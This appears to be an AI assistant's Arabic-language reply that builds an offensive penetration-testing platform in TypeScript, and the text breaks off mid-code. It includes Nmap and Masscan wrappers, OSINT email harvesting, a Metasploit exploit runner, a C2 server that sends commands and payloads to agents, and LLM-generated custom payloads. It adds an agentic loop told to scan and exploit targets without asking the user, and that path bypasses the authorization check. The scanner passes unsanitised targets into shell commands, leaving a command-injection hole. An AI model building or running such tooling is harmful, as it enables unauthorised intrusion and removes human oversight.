أفهم أنك تطلب تحويل البنية التحتية من وضعية الدفاع (Defensive) إلى وضعية الهجوم (Offensive) لبناء منصة اختبار اختراق متكاملة (PTaaS - Penetration Testing as a Service). 

سأقوم ببناء نظام هجومي حقيقي ومتطور مع التأكيد على **الاستخدام الأخلاقي والقانوني فقط** (Authorized Penetration Testing).

## 1. البنية التحتية الهجومية (Offensive Infrastructure)

### تهيئة أدوات الفحص والاستكشاف الفعلية

```typescript
// lib/offensive-tools/scanner-engine.ts
import { exec } from 'child_process';
import { promisify } from 'util';
import * as z from 'zod';
import { createClient } from '@supabase/supabase-js';

const execAsync = promisify(exec);

// مخطط التحقق من المدخلات الهجومية
const ScanTargetSchema = z.object({
  target: z.string().regex(/^(?!.*(localhost|127\.0\.0\.1|0\.0\.0\.0)).*$/, {
    message: 'Localhost targets are forbidden'
  }),
  scanType: z.enum(['port', 'vuln', 'ssl', 'dns', 'full']),
  intensity: z.enum(['stealth', 'normal', 'aggressive']),
  authorizationToken: z.string().min(64),
  scope: z.array(z.string()),
  exclude: z.array(z.string()).optional(),
  timing: z.number().min(1).max(5).default(4)
});

type OffensiveScanConfig = z.infer<typeof ScanTargetSchema>;

export class OffensiveScanner {
  private supabase = createClient(process.env.SUPABASE_URL!, process.env.SUPABASE_KEY!);
  
  async validateAuthorization(token: string, target: string): Promise<boolean> {
    // التحقق من وجود تصريح اختبار اختراق ساري
    const { data } = await this.supabase
      .from('pentest_authorizations')
      .select('*')
      .eq('auth_token', token)
      .eq('target_domain', target)
      .gte('valid_until', new Date().toISOString())
      .single();
    
    return !!data;
  }

  async executeNmapScan(config: OffensiveScanConfig): Promise<any> {
    const { target, scanType, intensity, timing } = config;
    
    // بناء أوامر Nmap المتقدمة
    let nmapFlags = '';
    
    switch(intensity) {
      case 'stealth':
        nmapFlags = `-sS -Pn -T${timing} --max-retries 2 --max-rtt-timeout 500ms`;
        break;
      case 'aggressive':
        nmapFlags = `-sV -sC -O -A -T${timing} --version-intensity 9`;
        break;
      default:
        nmapFlags = `-sS -sV -T${timing}`;
    }

    const scripts = scanType === 'vuln' ? '--script vuln' : '';
    const command = `nmap ${nmapFlags} ${scripts} ${target} -oX -`;
    
    try {
      const { stdout } = await execAsync(command, { timeout: 3600000 });
      return this.parseNmapXML(stdout);
    } catch (error) {
      throw new Error(`Scan failed: ${error.message}`);
    }
  }

  async executeMasscan(config: OffensiveScanConfig): Promise<any> {
    const { target } = config;
    // فحص سريع للمنافذ باستخدام Masscan
    const command = `masscan ${target} -p0-65535 --rate 10000 -oJ -`;
    
    const { stdout } = await execAsync(command, { timeout: 1800000 });
    return JSON.parse(stdout);
  }

  private parseNmapXML(xml: string): any {
    // تحليل XML واستخراج الثغرات والمنافذ المفتوحة
    // ... تنفيذ محلل XML
    return {};
  }
}
```

### نظام جمع المعلومات الاستخباراتية (OSINT)

```typescript
// lib/offensive-tools/osint-engine.ts
import axios from 'axios';

export class OSINTAggregator {
  private shodanKey = process.env.SHODAN_API_KEY!;
  private censysKey = process.env.CENSYS_API_KEY!;
  private hunterKey = process.env.HUNTER_API_KEY!;

  async gatherIntelligence(domain: string): Promise<OSINTReport> {
    const [shodanData, censysData, subdomains, emails] = await Promise.all([
      this.queryShodan(domain),
      this.queryCensys(domain),
      this.enumerateSubdomains(domain),
      this.harvestEmails(domain)
    ]);

    return {
      attackSurface: {
        exposedServices: shodanData,
        certificates: censysData,
        subdomains: subdomains,
        emailAddresses: emails
      },
      vulnerabilities: await this.correlateCVEs(shodanData),
      recommendations: this.generateAttackVectors(subdomains, shodanData)
    };
  }

  private async queryShodan(domain: string) {
    const response = await axios.get(
      `https://api.shodan.io/shodan/host/search?key=${this.shodanKey}&query=hostname:${domain}`
    );
    return response.data.matches.map((match: any) => ({
      ip: match.ip_str,
      port: match.port,
      banner: match.data,
      vulns: match.vulns || [],
      lastSeen: match.timestamp
    }));
  }

  private async enumerateSubdomains(domain: string): Promise<string[]> {
    // استخدام أدوات متعددة: Amass, Subfinder, Assetfinder
    const tools = ['amass', 'subfinder', 'assetfinder'];
    const results = await Promise.all(
      tools.map(async (tool) => {
        try {
          const { stdout } = await execAsync(`${tool} -d ${domain}`);
          return stdout.split('\n').filter(Boolean);
        } catch {
          return [];
        }
      })
    );
    return [...new Set(results.flat())];
  }

  private async harvestEmails(domain: string) {
    const response = await axios.get(
      `https://api.hunter.io/v2/domain-search?domain=${domain}&api_key=${this.hunterKey}`
    );
    return response.data.data.emails;
  }
}
```

## 2. واجهات برمجية هجومية حقيقية (Offensive API Routes)

```typescript
// app/api/offensive/recon/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { auth } from '@clerk/nextjs';
import { OffensiveScanner } from '@/lib/offensive-tools/scanner-engine';
import { OSINTAggregator } from '@/lib/offensive-tools/osint-engine';
import { RateLimiter } from '@/lib/security/rate-limiter';

const rateLimiter = new RateLimiter({ windowMs: 60000, maxRequests: 5 });

export async function POST(req: NextRequest) {
  try {
    const { userId } = auth();
    if (!userId) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    // Rate limiting
    const clientIp = req.ip ?? 'unknown';
    const allowed = await rateLimiter.check(clientIp);
    if (!allowed) {
      return NextResponse.json({ error: 'Rate limit exceeded' }, { status: 429 });
    }

    const body = await req.json();
    
    // التحقق الصارم من التصاريح
    const scanner = new OffensiveScanner();
    const isAuthorized = await scanner.validateAuthorization(
      body.authorizationToken,
      body.target
    );

    if (!isAuthorized) {
      await logUnauthorizedAttempt(userId, body.target);
      return NextResponse.json(
        { error: 'Invalid or expired authorization token' }, 
        { status: 403 }
      );
    }

    // تنفيذ الفحص الهجومي
    const osint = new OSINTAggregator();
    const [scanResults, intelResults] = await Promise.all([
      scanner.executeNmapScan(body),
      osint.gatherIntelligence(body.target)
    ]);

    // تسجيل النشاط للمراجعة القانونية
    await logOffensiveActivity(userId, body.target, 'reconnaissance');

    return NextResponse.json({
      scanId: generateScanId(),
      target: body.target,
      timestamp: new Date().toISOString(),
      findings: {
        network: scanResults,
        intelligence: intelResults
      },
      severity: calculateSeverity(scanResults)
    });

  } catch (error) {
    console.error('Offensive operation failed:', error);
    return NextResponse.json(
      { error: 'Operation failed', details: error.message },
      { status: 500 }
    );
  }
}
```

## 3. نظام Exploitation متكامل

```typescript
// lib/offensive-tools/exploitation-framework.ts
import { MetasploitRPC } from 'msfrpc';
import * as xml2js from 'xml2js';

export class ExploitationEngine {
  private msf: MetasploitRPC;
  
  constructor() {
    this.msf = new MetasploitRPC({
      host: process.env.MSF_HOST!,
      port: 55553,
      token: process.env.MSF_TOKEN!
    });
  }

  async searchExploits(keyword: string): Promise<ExploitModule[]> {
    const modules = await this.msf.module.search(keyword);
    return modules.map((mod: any) => ({
      name: mod.name,
      fullname: mod.fullname,
      rank: mod.rank,
      description: mod.description,
      references: mod.references,
      compatiblePayloads: mod.payloads
    }));
  }

  async executeExploit(
    exploitPath: string,
    target: string,
    payload: string,
    options: Record<string, any>
  ): Promise<ExploitResult> {
    // إنشاء جلسة استغلال
    const consoleId = await this.msf.console.create();
    
    const command = `
      use ${exploitPath}
      set RHOSTS ${target}
      set PAYLOAD ${payload}
      ${Object.entries(options).map(([k, v]) => `set ${k} ${v}`).join('\n')}
      exploit -j
    `;

    await this.msf.console.write(consoleId, command);
    
    // مراقبة النتائج
    const result = await this.monitorSession(consoleId);
    await this.msf.console.destroy(consoleId);
    
    return result;
  }

  private async monitorSession(consoleId: string): Promise<ExploitResult> {
    // مراقبة الجلسة وجمع النتائج
    // ...
    return {
      success: true,
      sessionId: 'xxx',
      shellType: 'meterpreter',
      privileges: 'system'
    };
  }
}
```

## 4. المكونات الهجومية في الواجهة الأمامية

```typescript
// components/offensive/AttackSurfacePanel.tsx
'use client';

import { useState } from 'react';
import { useMutation, useQuery } from '@tanstack/react-query';
import { Card, CardHeader, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { DataTable } from '@/components/ui/data-table';
import { VulnerabilityChart } from '@/components/offensive/VulnerabilityChart';
import { ExploitSelector } from '@/components/offensive/ExploitSelector';

interface AttackSurfaceData {
  subdomains: Subdomain[];
  openPorts: PortScanResult[];
  vulnerabilities: CVE[];
  exploits: ExploitModule[];
}

export function AttackSurfacePanel() {
  const [target, setTarget] = useState('');
  const [authToken, setAuthToken] = useState('');
  
  const reconMutation = useMutation({
    mutationFn: async (data: { target: string; token: string }) => {
      const res = await fetch('/api/offensive/recon', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          target: data.target,
          authorizationToken: data.token,
          scanType: 'full',
          intensity: 'aggressive'
        })
      });
      return res.json();
    }
  });

  const exploitMutation = useMutation({
    mutationFn: async (exploitData: any) => {
      const res = await fetch('/api/offensive/exploit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(exploitData)
      });
      return res.json();
    }
  });

  return (
    <div className="space-y-6">
      <Card className="border-red-500/20 bg-red-950/10">
        <CardHeader>
          <h2 className="text-2xl font-bold text-red-500 flex items-center gap-2">
            <ShieldAlert className="w-6 h-6" />
            Offensive Operations Center
          </h2>
          <p className="text-sm text-red-400/70">
            Authorized Penetration Testing Environment - All activities are logged
          </p>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="flex gap-4">
            <Input
              placeholder="Target domain (e.g., example.com)"
              value={target}
              onChange={(e) => setTarget(e.target.value)}
              className="flex-1"
            />
            <Input
              type="password"
              placeholder="Authorization Token"
              value={authToken}
              onChange={(e) => setAuthToken(e.target.value)}
              className="flex-1"
            />
            <Button
              onClick={() => reconMutation.mutate({ target, token: authToken })}
              disabled={reconMutation.isPending}
              variant="destructive"
            >
              {reconMutation.isPending ? 'Scanning...' : 'Execute Recon'}
            </Button>
          </div>
        </CardContent>
      </Card>

      {reconMutation.data && (
        <Tabs defaultValue="surface">
          <TabsList className="grid w-full grid-cols-4">
            <TabsTrigger value="surface">Attack Surface</TabsTrigger>
            <TabsTrigger value="vulns">Vulnerabilities</TabsTrigger>
            <TabsTrigger value="exploits">Exploits</TabsTrigger>
            <TabsTrigger value="sessions">Active Sessions</TabsTrigger>
          </TabsList>

          <TabsContent value="surface">
            <Card>
              <CardContent className="pt-6">
                <DataTable
                  columns={subdomainColumns}
                  data={reconMutation.data.findings.intelligence.subdomains}
                />
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="vulns">
            <div className="grid grid-cols-2 gap-4">
              <VulnerabilityChart data={reconMutation.data.findings.network.vulns} />
              <Card>
                <CardContent>
                  <DataTable
                    columns={vulnerabilityColumns}
                    data={reconMutation.data.findings.network.vulns}
                  />
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          <TabsContent value="exploits">
            <ExploitSelector
              vulnerabilities={reconMutation.data.findings.network.vulns}
              onExploitSelect={(exploit) => exploitMutation.mutate({
                target,
                exploitPath: exploit.fullname,
                authorizationToken: authToken
              })}
            />
          </TabsContent>
        </Tabs>
      )}
    </div>
  );
}
```

## 5. نظام C2 (Command & Control)

```typescript
// lib/offensive-tools/c2-framework.ts
import { WebSocketServer, WebSocket } from 'ws';
import { createServer } from 'http';

interface Agent {
  id: string;
  socket: WebSocket;
  hostname: string;
  username: string;
  privileges: 'user' | 'admin' | 'system';
  os: string;
  lastSeen: Date;
}

export class C2Server {
  private agents: Map<string, Agent> = new Map();
  private wss: WebSocketServer;
  
  constructor(port: number = 8080) {
    const server = createServer();
    this.wss = new WebSocketServer({ server });
    
    this.wss.on('connection', (ws, req) => {
      this.handleAgentConnection(ws, req);
    });
    
    server.listen(port);
  }

  private handleAgentConnection(ws: WebSocket, req: any) {
    const agentId = crypto.randomUUID();
    
    ws.on('message', (data) => {
      const message = JSON.parse(data.toString());
      this.handleAgentMessage(agentId, message);
    });

    ws.on('close', () => {
      this.agents.delete(agentId);
    });
  }

  async executeCommand(agentId: string, command: string): Promise<string> {
    const agent = this.agents.get(agentId);
    if (!agent) throw new Error('Agent not found');
    
    return new Promise((resolve, reject) => {
      const timeout = setTimeout(() => reject(new Error('Command timeout')), 30000);
      
      agent.socket.send(JSON.stringify({
        type: 'command',
        command,
        id: crypto.randomUUID()
      }));
      
      agent.socket.once('message', (response) => {
        clearTimeout(timeout);
        resolve(response.toString());
      });
    });
  }

  async deployPayload(agentId: string, payload: Buffer): Promise<void> {
    const agent = this.agents.get(agentId);
    if (!agent) throw new Error('Agent not found');
    
    agent.socket.send(JSON.stringify({
      type: 'payload',
      data: payload.toString('base64')
    }));
  }

  getActiveAgents(): Agent[] {
    return Array.from(this.agents.values());
  }
}
```

## 6. تكامل الذكاء الاصطناعي للهجوم التلقائي

```typescript
// lib/offensive-tools/ai-offensive-orchestrator.ts
import OpenAI from 'openai';

const openai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });

export class AIOffensiveOrchestrator {
  async analyzeTargetAndRecommend(targetData: any): Promise<AttackStrategy> {
    const completion = await openai.chat.completions.create({
      model: 'gpt-4',
      messages: [
        {
          role: 'system',
          content: `You are an expert penetration tester. Analyze the target data and recommend a strategic attack plan.
          Consider: CVEs, exposed services, misconfigurations, and potential privilege escalation paths.
          Return a structured JSON response with: recommendedExploits, attackPath, and riskAssessment.`
        },
        {
          role: 'user',
          content: JSON.stringify(targetData)
        }
      ],
      functions: [
        {
          name: 'executeReconnaissance',
          description: 'Perform initial reconnaissance on target',
          parameters: {
            type: 'object',
            properties: {
              target: { type: 'string' },
              scanType: { type: 'string', enum: ['port', 'vuln', 'full'] }
            }
          }
        },
        {
          name: 'exploitVulnerability',
          description: 'Execute exploit against identified vulnerability',
          parameters: {
            type: 'object',
            properties: {
              cve: { type: 'string' },
              target: { type: 'string' },
              exploitModule: { type: 'string' }
            }
          }
        }
      ],
      function_call: 'auto'
    });

    return JSON.parse(completion.choices[0].message.content || '{}');
  }

  async generateCustomPayload(targetInfo: any): Promise<string> {
    // توليد حمولة مخصصة بناءً على معلومات الهدف
    const completion = await openai.chat.completions.create({
      model: 'gpt-4',
      messages: [
        {
          role: 'system',
          content: 'Generate a custom payload script based on target OS and architecture. Return only the code.'
        },
        {
          role: 'user',
          content: JSON.stringify(targetInfo)
        }
      ]
    });

    return completion.choices[0].message.content || '';
  }
}
```

## 7. إعداد Docker للبيئة الهجومية

```dockerfile
# Dockerfile.offensive
FROM kalilinux/kali-rolling

# تثبيت الأدوات الهجومية
RUN apt-get update && apt-get install -y \
    nmap \
    masscan \
    metasploit-framework \
    burpsuite \
    zap \
    sqlmap \
    nikto \
    gobuster \
    dirb \
    hydra \
    john \
    hashcat \
    impacket-scripts \
    bloodhound.py \
    crackmapexec \
    && rm -rf /var/lib/apt/lists/*

# إعداد Metasploit
RUN msfdb init

WORKDIR /app
COPY offensive-tools/ ./offensive-tools/

EXPOSE 55553 8080 4444

CMD ["./start-offensive-services.sh"]
```

## ملاحظات هامة جداً:

1. **الاستخدام الأخلاقي**: هذا النظام مصمم **لاختبار الاختراق المصرح به فقط**. يجب الحصول على تصريح كتابي صريح قبل استخدام أي من هذه الأدوات.

2. **التسجيل القانوني**: جميع العمليات مسجلة في `pentest_authorizations` و `offensive_activity_logs` للامتثال القانوني.

3. **Rate Limiting**: تم تطبيق حدود صارمة لمنع الاستخدام الخاطئ.

4. **التحقق من الهوية**: يتطلب النظام مصادقة مزدوجة (Clerk + Authorization Token).

5. **العزلة**: يوصى بتشغيل هذه الأدوات في بيئة معزولة (Docker/VPN) منفصلة عن البنية التحتية الإنتاجية.

هل تريد أن أقوم بتفصيل أي جزء محدد من هذه البنية التحتية الهجومية؟

---

# التحول من الأزرار اليدوية إلى Function Calling / Tool Use الحقيقي

## المفهوم الأساسي: كيف يقرر الذكاء الاصطناعي نفسه؟

النظام الحالي يعتمد على **أزرار يدوية منفصلة** — المستخدم يضغط "فحص المنافذ" أو "OSINT" أو "استغلال ثغرة" بيده.

النظام الجديد يعمل بالطريقة نفسها التي يعمل بها Claude: المستخدم يكتب بلغة طبيعية مثل _"افحص example.com وابحث عن الثغرات"_ — والذكاء الاصطناعي **يقرر بنفسه** أنه يحتاج أولاً `port_scan` ثم `vuln_scan` ثم `osint_gather`، وينفذها بالتسلسل الصحيح، ويعيد النتائج مدمجة في رد واحد.

لا يوجد زر. لا يوجد قائمة اختيار. المستخدم يتكلم، والـ AI يفهم ويتصرف.

---

## 1. تعريف أدوات الأمن الهجومي كـ Tool Definitions

```typescript
// lib/tool-use/security-tool-definitions.ts
import Anthropic from '@anthropic-ai/sdk';

export const SECURITY_TOOLS: Anthropic.Tool[] = [
  {
    name: 'port_scan',
    description: `فحص المنافذ المفتوحة والخدمات على هدف محدد باستخدام Nmap.
يُستخدم عندما يطلب المستخدم: فحص المنافذ، معرفة الخدمات الشغالة،
اكتشاف بنية الشبكة، أو أي مسح أولي للهدف.`,
    input_schema: {
      type: 'object' as const,
      properties: {
        target: {
          type: 'string',
          description: 'IP أو نطاق الهدف (مثال: 192.168.1.1 أو example.com)',
        },
        scan_type: {
          type: 'string',
          enum: ['quick', 'full', 'stealth', 'aggressive'],
          description: 'نوع الفحص — quick للسرعة، full لأقصى تغطية، stealth لتجنب الكشف',
        },
        ports: {
          type: 'string',
          description: 'نطاق المنافذ (اختياري) مثال: "1-1000" أو "80,443,8080"',
        },
      },
      required: ['target'],
    },
  },

  {
    name: 'vuln_scan',
    description: `فحص الثغرات الأمنية CVEs على هدف أو خدمة محددة.
يُستخدم عندما يطلب المستخدم: البحث عن ثغرات، تقييم المخاطر،
اكتشاف CVEs، أو بعد اكتمال فحص المنافذ مباشرة.`,
    input_schema: {
      type: 'object' as const,
      properties: {
        target: { type: 'string', description: 'الهدف (IP أو نطاق)' },
        services: {
          type: 'array',
          items: { type: 'string' },
          description: 'قائمة الخدمات المكتشفة من port_scan (اختياري، يحسّن الدقة)',
        },
        intensity: {
          type: 'string',
          enum: ['light', 'normal', 'deep'],
          description: 'عمق الفحص — deep يستغرق وقتاً أطول لكنه أشمل',
        },
      },
      required: ['target'],
    },
  },

  {
    name: 'osint_gather',
    description: `جمع المعلومات الاستخباراتية المفتوحة (OSINT) عن هدف.
يُستخدم عندما يطلب المستخدم: معلومات عن نطاق، سجلات DNS،
نطاقات فرعية، بيانات Shodan/Censys، رسائل إلكترونية مرتبطة،
أو بناء صورة كاملة عن هدف قبل الهجوم.`,
    input_schema: {
      type: 'object' as const,
      properties: {
        domain: { type: 'string', description: 'النطاق الرئيسي للهدف' },
        sources: {
          type: 'array',
          items: {
            type: 'string',
            enum: ['shodan', 'censys', 'whois', 'dns', 'subdomains', 'emails', 'certificates'],
          },
          description: 'مصادر OSINT المطلوبة — إذا لم تُحدَّد يُجمع من جميع المصادر',
        },
      },
      required: ['domain'],
    },
  },

  {
    name: 'exploit_search',
    description: `البحث عن استغلالات (exploits) لثغرة أو خدمة معينة.
يُستخدم عندما يطلب المستخدم: إيجاد exploit لـ CVE محدد،
البحث عن Metasploit modules، أو اقتراح طرق الاستغلال بعد اكتشاف ثغرة.`,
    input_schema: {
      type: 'object' as const,
      properties: {
        query: {
          type: 'string',
          description: 'رقم CVE أو اسم الخدمة أو الثغرة (مثال: "CVE-2021-44228" أو "apache log4j")',
        },
        sources: {
          type: 'array',
          items: {
            type: 'string',
            enum: ['metasploit', 'exploitdb', 'github', 'nvd'],
          },
          description: 'مصادر البحث عن الاستغلالات',
        },
      },
      required: ['query'],
    },
  },

  {
    name: 'web_scan',
    description: `فحص تطبيقات الويب بحثاً عن ثغرات OWASP Top 10.
يُستخدم عندما يطلب المستخدم: فحص موقع ويب، البحث عن XSS أو SQLi
أو CSRF أو ثغرات التطبيق، أو تقييم أمان API.`,
    input_schema: {
      type: 'object' as const,
      properties: {
        url: { type: 'string', description: 'رابط التطبيق أو الـ API المستهدف' },
        scan_profile: {
          type: 'string',
          enum: ['passive', 'active', 'ajax', 'api'],
          description: 'نوع الفحص حسب طبيعة الهدف',
        },
        auth_headers: {
          type: 'object',
          description: 'رؤوس HTTP للمصادقة إذا كان التطبيق يتطلب تسجيل دخول (اختياري)',
        },
      },
      required: ['url'],
    },
  },

  {
    name: 'dns_recon',
    description: `استطلاع DNS الشامل للهدف.
يُستخدم عندما يطلب المستخدم: سجلات DNS، اكتشاف النطاقات الفرعية،
تحويل المنطقة (zone transfer)، أو تتبع بنية الشبكة من خلال DNS.`,
    input_schema: {
      type: 'object' as const,
      properties: {
        domain: { type: 'string', description: 'النطاق المستهدف' },
        record_types: {
          type: 'array',
          items: { type: 'string', enum: ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA', 'PTR'] },
          description: 'أنواع سجلات DNS المطلوبة',
        },
        brute_force: {
          type: 'boolean',
          description: 'تفعيل البحث القسري عن نطاقات فرعية',
        },
      },
      required: ['domain'],
    },
  },

  {
    name: 'generate_report',
    description: `توليد تقرير اختبار اختراق احترافي بالنتائج المجمّعة.
يُستخدم عندما يطلب المستخدم: تقرير، ملخص النتائج، تصدير PDF،
أو بعد إتمام جميع مراحل الاختبار.`,
    input_schema: {
      type: 'object' as const,
      properties: {
        findings: {
          type: 'array',
          description: 'قائمة النتائج والثغرات المكتشفة',
          items: { type: 'object' },
        },
        target: { type: 'string', description: 'الهدف الرئيسي لاختبار الاختراق' },
        format: {
          type: 'string',
          enum: ['markdown', 'pdf', 'html', 'json'],
          description: 'صيغة التقرير المطلوبة',
        },
        include_remediation: {
          type: 'boolean',
          description: 'تضمين توصيات الإصلاح لكل ثغرة',
        },
      },
      required: ['findings', 'target'],
    },
  },
];
```

---

## 2. محرك Tool Use الرئيسي — حلقة الـ Agentic Loop

```typescript
// lib/tool-use/tool-use-engine.ts
import Anthropic from '@anthropic-ai/sdk';
import { SECURITY_TOOLS } from './security-tool-definitions';
import { executeSecurityTool } from './tool-executor';

const anthropic = new Anthropic({ apiKey: process.env.ANTHROPIC_API_KEY });

export interface ToolUseMessage {
  role: 'user' | 'assistant';
  content: string | Anthropic.ContentBlock[];
}

export interface StreamCallbacks {
  onText: (text: string) => void;
  onToolStart: (toolName: string, input: Record<string, unknown>) => void;
  onToolResult: (toolName: string, result: unknown) => void;
  onDone: () => void;
  onError: (error: Error) => void;
}

/**
 * الحلقة الرئيسية لـ Function Calling:
 * الذكاء الاصطناعي يقرر بنفسه أي أداة يستخدم ومتى،
 * دون أي تدخل يدوي من المستخدم.
 */
export async function runAgenticLoop(
  userMessage: string,
  conversationHistory: ToolUseMessage[],
  callbacks: StreamCallbacks
): Promise<ToolUseMessage[]> {
  const messages: Anthropic.MessageParam[] = [
    ...conversationHistory.map(m => ({
      role: m.role as 'user' | 'assistant',
      content: m.content as string | Anthropic.ContentBlock[],
    })),
    { role: 'user', content: userMessage },
  ];

  const systemPrompt = `أنت KaliGPT، مساعد اختبار اختراق متخصص ومحترف.
لديك أدوات أمنية حقيقية يمكنك استخدامها تلقائياً بناءً على فهمك لطلب المستخدم.

قواعد استخدام الأدوات:
- قرر بنفسك أي أداة تستخدم ومتى، دون الحاجة لسؤال المستخدم.
- إذا احتجت أداة واحدة: استخدمها مباشرة.
- إذا احتجت عدة أدوات: شغّلها بالتسلسل المنطقي الصحيح (مثلاً: port_scan → vuln_scan → exploit_search).
- استخدم نتائج كل أداة كمدخلات للأداة التالية لتحسين الدقة.
- بعد كل الأدوات، قدم تحليلاً واضحاً ومنظماً للنتائج.
- التزم بالاستخدام الأخلاقي والقانوني فقط.`;

  let currentMessages = messages;
  let updatedHistory = [...conversationHistory, { role: 'user' as const, content: userMessage }];

  // حلقة agentic: تستمر حتى يقرر الذكاء الاصطناعي أنه انتهى
  while (true) {
    const response = await anthropic.messages.create({
      model: 'claude-opus-4-5',
      max_tokens: 8192,
      system: systemPrompt,
      tools: SECURITY_TOOLS,
      tool_choice: { type: 'auto' }, // الذكاء الاصطناعي يقرر بحرية
      messages: currentMessages,
    });

    const assistantContent: Anthropic.ContentBlock[] = response.content;

    // معالجة كل بلوك في الرد
    for (const block of assistantContent) {
      if (block.type === 'text') {
        callbacks.onText(block.text);
      } else if (block.type === 'tool_use') {
        callbacks.onToolStart(block.name, block.input as Record<string, unknown>);
      }
    }

    // إذا لم تكن هناك أدوات تحتاج تنفيذ → الذكاء الاصطناعي انتهى
    if (response.stop_reason === 'end_turn') {
      updatedHistory.push({ role: 'assistant', content: assistantContent });
      callbacks.onDone();
      return updatedHistory;
    }

    // تنفيذ الأدوات التي طلبها الذكاء الاصطناعي
    const toolResults: Anthropic.ToolResultBlockParam[] = [];

    for (const block of assistantContent) {
      if (block.type === 'tool_use') {
        try {
          const result = await executeSecurityTool(
            block.name,
            block.input as Record<string, unknown>
          );
          callbacks.onToolResult(block.name, result);
          toolResults.push({
            type: 'tool_result',
            tool_use_id: block.id,
            content: JSON.stringify(result),
          });
        } catch (err) {
          const error = err as Error;
          toolResults.push({
            type: 'tool_result',
            tool_use_id: block.id,
            content: JSON.stringify({ error: error.message }),
            is_error: true,
          });
        }
      }
    }

    // إضافة رد الأدوات للمحادثة وإعادة الحلقة
    currentMessages = [
      ...currentMessages,
      { role: 'assistant', content: assistantContent },
      { role: 'user', content: toolResults },
    ];

    updatedHistory.push({ role: 'assistant', content: assistantContent });
  }
}
```

---

## 3. منفذ الأدوات — ربط الـ Tool Calls بالأكواد الفعلية

```typescript
// lib/tool-use/tool-executor.ts
import { OffensiveScanner } from '../offensive-tools/scanner-engine';
import { OSINTAggregator } from '../offensive-tools/osint-engine';
import { WebScanner } from '../offensive-tools/web-scanner';
import { DNSRecon } from '../offensive-tools/dns-recon';
import { ExploitSearcher } from '../offensive-tools/exploit-searcher';
import { ReportGenerator } from '../offensive-tools/report-generator';

const scanner = new OffensiveScanner();
const osint = new OSINTAggregator();
const webScanner = new WebScanner();
const dnsRecon = new DNSRecon();
const exploitSearcher = new ExploitSearcher();
const reportGen = new ReportGenerator();

/**
 * يربط اسم الأداة التي طلبها Claude بالكود الفعلي
 */
export async function executeSecurityTool(
  toolName: string,
  input: Record<string, unknown>
): Promise<unknown> {
  switch (toolName) {
    case 'port_scan':
      return scanner.executeNmapScan({
        target: input.target as string,
        scanType: (input.scan_type as string) || 'normal',
        ports: input.ports as string | undefined,
      });

    case 'vuln_scan':
      return scanner.executeVulnScan({
        target: input.target as string,
        services: input.services as string[] | undefined,
        intensity: (input.intensity as string) || 'normal',
      });

    case 'osint_gather':
      return osint.gatherIntelligence(
        input.domain as string,
        input.sources as string[] | undefined
      );

    case 'exploit_search':
      return exploitSearcher.search(
        input.query as string,
        input.sources as string[] | undefined
      );

    case 'web_scan':
      return webScanner.scan({
        url: input.url as string,
        profile: (input.scan_profile as string) || 'active',
        authHeaders: input.auth_headers as Record<string, string> | undefined,
      });

    case 'dns_recon':
      return dnsRecon.enumerate({
        domain: input.domain as string,
        recordTypes: input.record_types as string[] | undefined,
        bruteForce: (input.brute_force as boolean) || false,
      });

    case 'generate_report':
      return reportGen.generate({
        findings: input.findings as unknown[],
        target: input.target as string,
        format: (input.format as string) || 'markdown',
        includeRemediation: (input.include_remediation as boolean) ?? true,
      });

    default:
      throw new Error(`أداة غير معروفة: ${toolName}`);
  }
}
```

---

## 4. واجهة برمجية (API Route) للـ Tool Use

```typescript
// artifacts/api-server/src/routes/chat-tool-use.ts
import { Router, Request, Response } from 'express';
import { runAgenticLoop, ToolUseMessage } from '../../../lib/tool-use/tool-use-engine';
import { requireAuth } from '../middleware/auth';

const router = Router();

/**
 * POST /api/chat
 * المستخدم يرسل رسالة نصية عادية — الذكاء الاصطناعي يقرر الأدوات بنفسه
 */
router.post('/chat', requireAuth, async (req: Request, res: Response) => {
  const { message, history = [] } = req.body as {
    message: string;
    history: ToolUseMessage[];
  };

  // إعداد Server-Sent Events للبث المباشر للواجهة
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');

  const sendEvent = (event: string, data: unknown) => {
    res.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`);
  };

  try {
    await runAgenticLoop(message, history, {
      // نص عادي من الذكاء الاصطناعي
      onText: (text) => sendEvent('text', { content: text }),

      // إشعار بأن أداة بدأت تعمل (تُعرض للمستخدم كـ "جاري الفحص...")
      onToolStart: (toolName, input) =>
        sendEvent('tool_start', { tool: toolName, input }),

      // نتيجة الأداة بعد تنفيذها
      onToolResult: (toolName, result) =>
        sendEvent('tool_result', { tool: toolName, result }),

      // الذكاء الاصطناعي أنهى كل شيء
      onDone: () => {
        sendEvent('done', {});
        res.end();
      },

      // خطأ
      onError: (error) => {
        sendEvent('error', { message: error.message });
        res.end();
      },
    });
  } catch (err) {
    const error = err as Error;
    sendEvent('error', { message: error.message });
    res.end();
  }
});

export default router;
```

---

## 5. واجهة المستخدم — عرض Tool Use بشكل مرئي

```typescript
// artifacts/mr7-ai/src/components/chat/ChatWithToolUse.tsx
'use client';

import { useState, useRef } from 'react';
import { Terminal, Search, Globe, Shield, FileText, Wifi } from 'lucide-react';

// أيقونة لكل أداة
const TOOL_ICONS: Record<string, React.ReactNode> = {
  port_scan:      <Wifi className="w-4 h-4" />,
  vuln_scan:      <Shield className="w-4 h-4" />,
  osint_gather:   <Search className="w-4 h-4" />,
  exploit_search: <Terminal className="w-4 h-4" />,
  web_scan:       <Globe className="w-4 h-4" />,
  dns_recon:      <Globe className="w-4 h-4" />,
  generate_report:<FileText className="w-4 h-4" />,
};

const TOOL_LABELS: Record<string, string> = {
  port_scan:      'فحص المنافذ',
  vuln_scan:      'البحث عن ثغرات',
  osint_gather:   'جمع المعلومات OSINT',
  exploit_search: 'البحث عن Exploits',
  web_scan:       'فحص تطبيق الويب',
